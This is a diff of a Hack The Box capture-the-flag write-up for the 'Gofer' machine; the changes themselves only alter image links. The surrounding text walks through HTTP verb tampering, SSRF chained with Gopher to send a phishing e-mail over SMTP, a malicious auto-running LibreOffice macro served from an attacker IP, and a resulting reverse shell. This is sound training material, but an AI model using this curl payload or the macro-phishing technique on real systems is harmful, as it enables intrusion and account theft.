@@ -1,8 +1,8 @@
 # HTB: Gofer (Part 1)
 
-[Gofer](../htb/machines/Gofer/) is a hard difficulty Linux machine on [Hack The Box](https://.hackthebox.com) involving the exploitation of HTTP verb tampering and chaining SSRF with Gopher protocol to send a phishing e-mail and compromise the user with malicious LibreOffice document. This writeup is divided into 2 parts. First part contains the web exploitation part of the machine and phishing to get the user and the second part will contain binary exploitation for privilege escalation.
+Gofer is a hard difficulty Linux machine on [Hack The Box](https://.hackthebox.com) involving the exploitation of HTTP verb tampering and chaining SSRF with Gopher protocol to send a phishing e-mail and compromise the user with malicious LibreOffice document. This writeup is divided into 2 parts. First part contains the web exploitation part of the machine and phishing to get the user and the second part will contain binary exploitation for privilege escalation.
 
-![[Gofer.png]]
+![](../../../assets/Gofer.png)
 
 ## Nmap
 
@@ -112,7 +112,7 @@ That's a lot of useful information for us. We can slowly start to see the attack
 
 ## HTTP
 
-![[Gofer-HTTP1.png]]
+![](../../../assets/Gofer-HTTP1.png)
 
 We are welcomed with a simple web page where no links seem to be working. Not even the e-mail form at the bottom of the page. Since we do not have much to do here, let's continue with fuzzing.
 
@@ -152,13 +152,13 @@ We have found one virtual host `proxy`. Let's add it to our host file. As we can
 
 ## proxy.gofer.htb
 
-![[Gofer-HTTP2.png]]
+![](../../../assets/Gofer-HTTP2.png)
 
 Right after hitting the endpoint we are prompted to enter the credentials. Unfortunately, we do not posses any set of credentials as of now, so it might be a good idea to search for some or to try to bypass the restriction.
 
 As mentioned above the `<Limit>` security boundary gives us a good hint on what to do next. Since from the `nmap` scan we know the web server is running `Apache/2.4.56`, we can search for `<Limit>` in the Apache documentation.
 
-![[Gofer-HTTP3.png]]
+![](../../../assets/Gofer-HTTP3.png)
 
 As expected the `<Limit>` restricts access to the endpoint via HTTP method. This is highly susceptible to HTTP verb tampering.
 
@@ -209,7 +209,7 @@ Content-Type: text/html; charset=UTF-8
 
 The endpoint asks us to use URL parameter. We can try to get a callback to our web server.
 
-![[Gofer-SSRF1.png]]
+![](../../../assets/Gofer-SSRF1.png)
 
 We can see that we triggered a Server-side Request Forgery (SSRF) vulnerability! Finally, we get something serious here. Let's recollect our findings and try to think how to chain them together.
 
@@ -285,7 +285,7 @@ Content-Type: text/html; charset=UTF-8
 
 After a while, Jocelyn was kind enough to click our link and we received a callback to our web server.
 
-![[Gofer-SSRF2.png]]
+![](../../../assets/Gofer-SSRF2.png)
 
 ## Let's go phishing! (Part 2)
 
@@ -319,11 +319,11 @@ Sub Main()
 End Sub
 ```
 
-![[Gofer-PHISH1.png]]
+![](../../../assets/Gofer-PHISH1.png)
 
 After the macro was created, we had to configure the document to auto run the malicious macro when someone opens the document. It can be done by customizing the `Open Document` event.
 
-![[Gofer-PHISH2.png]]
+![](../../../assets/Gofer-PHISH2.png)
 
 Steps 2 & 3
 
@@ -333,6 +333,6 @@ To execute the payload we can again execute our SSRF > Gopher chain using curl.
 curl -i -X POST 'http://proxy.gofer.htb/index.php?url=gopher://0x7f000001:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM:%3Chacker@site.com%3E%250d%250aRCPT%20TO:%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom:%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo:%20%3Cjhudson@gofer.htb%3E%250d%250aDate:%20Tue,%2015%20Sep%202017%2017:20:26%20-0400%250d%250aSubject:%20AH%20AH%20AH%250d%250a%250d%250ahttp://10.10.14.37/output.odt%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a'
 ```
 
-![[Gofer-SSRF3.png]]
+![](../../../assets/Gofer-SSRF3.png)
 
 After a while, Jocelyn was kind again and clicked on our malicious link and we received a reverse shell on the target system compromising Jocelyn's account.
